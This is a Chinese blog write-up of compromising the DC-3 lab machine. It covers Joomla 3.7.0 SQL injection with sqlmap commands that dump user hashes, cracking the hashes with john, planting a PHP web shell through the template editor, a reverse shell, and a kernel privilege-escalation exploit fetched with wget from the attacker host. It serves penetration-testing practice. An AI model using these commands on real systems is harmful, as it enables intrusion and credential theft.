---
link: https://blog.csdn.net/2403_88102829/article/details/156761678
title: dc3靶机报告
description: 记录 DC-3 靶机的 Joomla 识别、组件与模板入口排查、SQL 注入利用及内核提权过程，整理关键工具和参数。
excerpt: 记录 DC-3 靶机的 Joomla 识别、组件与模板入口排查、SQL 注入利用及内核提权过程，整理关键工具和参数。
keywords: 网络,web安全,靶机,linux,安全,dc
author: Lee
date: 2026-01-28T07:22:43.022Z
categories:
  - 靶场复现
tags:
  - DC靶场
  - Joomla
  - Linux
---

先arp-scan -l扫，发现疑似靶机ip——192.168.145.185

![](https://i-blog.csdnimg.cn/direct/44849b2f93a94525bacc07e4de5157af.png)

nmap进一步扫

![](https://i-blog.csdnimg.cn/direct/2a53cd79a30b437f9ab591dbc8466792.png)

分析一下回显：

只开了一个80端口，服务是http，服务是Apache/2.4.18 (Ubuntu)，操作系统是Linux 3.2 - 4.9，

CMS（内容管理系统）是Joomla！

我们打开网页看看，提示本次只存在一个flag，能在提权到root后拿到

![](https://i-blog.csdnimg.cn/direct/85b5d4457e2f472cb3b1c5ff2a120020.png)

![](https://i-blog.csdnimg.cn/direct/6f822321eea748719ad1279470a3e479.png)

nikto（网站安全扫描工具）扫一下，可以帮助我们得到敏感路径，安全问题，以及默认文件

![](https://i-blog.csdnimg.cn/direct/e6dba41802984286916060ac557561f9.png)

分析回显：

1：apache是2.4.18的，是2016版本，较老（2.4.54是2023的）

2：http debug可能开启，它的作用是让服务器返回调试信息，我们可以通过

curl -X DEBUG url ，去测试

3：安全头缺失

4：敏感目录暴露：

* `/administrator/` → 登录页面
* `/tmp/` → 尝试上传文件
* `/includes/` → 找配置文件（数据库密码）
* /bin/ ➡可能包含脚本文件

我们这用joomscan扫以下版本号

```
joomscan --url http://192.168.145.185
```

回显是3.7.0的版本

![](https://i-blog.csdnimg.cn/direct/8482b552243e40aca29b4d4afaaec823.png)

并且暴露出来几个目录列表

![](https://i-blog.csdnimg.cn/direct/7d58daf31fac4bb6ac08c3a5189492ac.png)

ps：补充几个常扫CMS的工具

joomscan——joomal

wpscan——wordpress

droopescan——drupal

我们挨个进去看看：

第一个：http://192.168.145.185/administrator/components

![](https://i-blog.csdnimg.cn/direct/ee857c514ddc451887e7a2f48ea126a8.png)

第二个：http://192.168.145.185/administrator/modules

![](https://i-blog.csdnimg.cn/direct/121c095930b246f8ab0a33b147fc9995.png)

第三个：http://192.168.145.185/administrator/templates

![](https://i-blog.csdnimg.cn/direct/be674e0677c04b6ca532a9e1dad363f1.png)

第四个：http://192.168.145.182/images/banners/

![](https://i-blog.csdnimg.cn/direct/d9bfee6a3c774352b46b29cf1b318303.png)

然后我们用searchsploit看看有没有可以利用的攻击点，看到第一个漏洞就是sql漏洞

![](https://i-blog.csdnimg.cn/direct/b4e9fee97e304fa096badeda4d01dad0.png)

我们把这个漏洞文件复制到当前目录然后cat一下

我们来分析一下这个文档，最上面的几个#后标注了这个sql漏洞的基本信息，然后给了一个url示例，接着是sqlmap的攻击示例

最下面是通过跑sqlmap本次攻击用到的几种方法——布尔盲注，报错注，时间盲注

![](https://i-blog.csdnimg.cn/direct/d48a1b6e1518464fa16602cf414067d1.png)

先试试url是否有不一样的回显，别忘了localhost换成靶机ip

```
URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```

![](https://i-blog.csdnimg.cn/direct/d6f9e675d70e4222ba4cf8e0c3ddfc0d.png)

有回显，可以尝试sqlmap了

"http://192.168.145.185/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

成功爆出数据库名

![](https://i-blog.csdnimg.cn/direct/b0e1899f09b749319526e108620a3e98.png)

去看joomladb的所有表，倒数第三个看到了users

```
sqlmap -u "http://192.168.145.185/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb --tables
```

![](https://i-blog.csdnimg.cn/direct/be9b1de4c8b0488cb5cf626b1a7c97e7.png)![](https://i-blog.csdnimg.cn/direct/d1016aced01f4763b4782291fd7fde01.png)

接着从users表里面爆列

```
sqlmap -u "http://192.168.145.185/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns
```

出来六列

![](https://i-blog.csdnimg.cn/direct/4a89928141eb4145b9ae8bac2a67819e.png)

只看名字和密码两列

```
sqlmap -u "http://192.168.145.185/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns -C "username,password" --dump --batch
```

出来了admin和admin的哈希加密密码wsl

![](https://i-blog.csdnimg.cn/direct/9863e363cdec4dc39a81773c54a3d87a.png)

然后随便创建一个txt文件把哈希数据存进去，用john来爆破密码

![](https://i-blog.csdnimg.cn/direct/b3330de1bb1d422a89e74dedd439d2a7.png)

![](https://i-blog.csdnimg.cn/direct/2c2df5d70bee490c87f7092ba0c50519.png)

![](https://i-blog.csdnimg.cn/direct/a1ddeb2b58814468b27f3403b05a3f75.png)

得到密码snoopy

![](https://i-blog.csdnimg.cn/direct/d742cf8b20a64ea9817a3873fb7003be.png)

去dc3页面上看登录

![](https://i-blog.csdnimg.cn/direct/bb741dc553134db99827b8a30f39bf86.png)

![](https://i-blog.csdnimg.cn/direct/51d7a69b105948fc82b4d1110aec2cf5.png)

如果很了解joomla框架的话，可以知道后台存在模板管理器，我们通过模板编辑功能可以写入恶意代码

位置在/templates/templates

我们在Extensions里面找到了模板文件

![](https://i-blog.csdnimg.cn/direct/d96d4a1ce18f486a877da467bd25b9e8.png)

进入第一个，这个Beezes3 detail and files，它是joomla的模板编辑入口，可以查看，编辑模板，上传文件

![](https://i-blog.csdnimg.cn/direct/a7c66ec6986a442a925d1f6af6d76b0e.png)

可以看到创建新文件的位置，我们创建新文件写入一句话木马

![](https://i-blog.csdnimg.cn/direct/325c86c539164c4993c37565a3079c09.png)

在分类里面创建一个php文件，获得一个11.php

![](https://i-blog.csdnimg.cn/direct/0f7f0a52d9ac4d0184e361a942c35bd3.png)

save创建

![](https://i-blog.csdnimg.cn/direct/3462fb0db61b4a118923a74d90e8f727.png)

蚁剑连接，joomla的模块会单独放在一个templates文件夹里，所以我们根据这个路径连接蚁剑

![](https://i-blog.csdnimg.cn/direct/861c836b5c884f1db9f0d829ed8aea04.png)

连接成功，在kali里面建立反弹shell，蚁剑目标机虚拟终端bash连接

![](https://i-blog.csdnimg.cn/direct/587c63b069184528b8f8433733e9013c.png)![](https://i-blog.csdnimg.cn/direct/7cc49b48c0284b189be9ad92f1cd88d9.png)

下一步就是提权

再开一个攻击端口，导到tmp目录下，用wget下载linux-exploit-suggester

注意，这里用的是https网址，所以我们需要加上一个无需检查证书直接下载的参数——--no-check-certificate

路径如下：

```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```

![](https://i-blog.csdnimg.cn/direct/8906c407894a4aacbb85c8d4167e8191.png)

然后把我们攻击机的http服务开开

![](https://i-blog.csdnimg.cn/direct/655371a0359c4d0e9c7581a558754571.png)

靶机反弹shell也导到tmp目录里
wget http://192.168.145.128:8000/linux-exploit-suggester.sh，通过我们的kali来下载

![](https://i-blog.csdnimg.cn/direct/0deb7917036c4d46903496a7afa103a0.png)

然后加入可执行权限

```
chmod +x linux-exploit-suggester.sh
```

然后执行这个这个脚本文件，爆出漏洞列表

```
./linux-exploit-suggester.sh
```

这把不用脏牛，看很多教程里大神用了双重释放漏洞，这里也用这个漏洞复现提权

![](https://i-blog.csdnimg.cn/direct/94ea12aaeb374855b836c4d491bc3967.png)

为了方便我这里直接在攻击机里面下载解压了

```
下载
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
解压
unzip 39771.zip
查看
ls -la 39772/
```

![](https://i-blog.csdnimg.cn/direct/e81161c44b7b47149d3815b7e4099151.png)

解压exploit的tar文件

![](https://i-blog.csdnimg.cn/direct/32c51d0a48844396b464d45008c49617.png)

cd过去，然后随便开个端口

![](https://i-blog.csdnimg.cn/direct/26f841a7a4114a768be22d7022469838.png)

还是wget下载文件，执行（忽略警告）

![](https://i-blog.csdnimg.cn/direct/ee4898edcd604e1ca34a3f46542bb63b.png)

提权成功！

python伪终端，然后cd到root

![](https://i-blog.csdnimg.cn/direct/93bac7de6ad3497e9f6d81d5db54b8e5.png)

发现the-flag.txt文件

![](https://i-blog.csdnimg.cn/direct/ff65548c60dd42928f9f0f0265a5b10f.png)

成功找到flag

![](https://i-blog.csdnimg.cn/direct/eda7626410354fc2b19531c042c03ffc.png)

完结撒花！！
